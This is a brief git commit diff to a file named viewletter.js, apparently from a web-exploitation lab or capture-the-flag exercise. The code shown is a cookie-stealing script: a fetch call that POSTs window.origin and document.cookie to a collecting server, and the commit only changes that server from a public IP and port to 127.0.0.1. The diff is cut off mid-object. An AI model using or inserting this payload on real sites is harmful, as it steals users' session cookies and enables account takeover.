35f797f379f8f54a4abbf122120d41832ae58c31
0x00tom <8040940+0x00tom@users.noreply.github.com>
2024-02-04 14:05:25 +0100

    Update viewletter.js

--- viewletter.js
+++ viewletter.js
@@ -1,5 +1,5 @@
 console.log("a");
-fetch('http://94.237.63.93:57831/submit', {
+fetch('http://127.0.0.1/submit', {
     method: 'POST',
     body: JSON.stringify({
         message: window.origin + " stuff "+document.cookie,
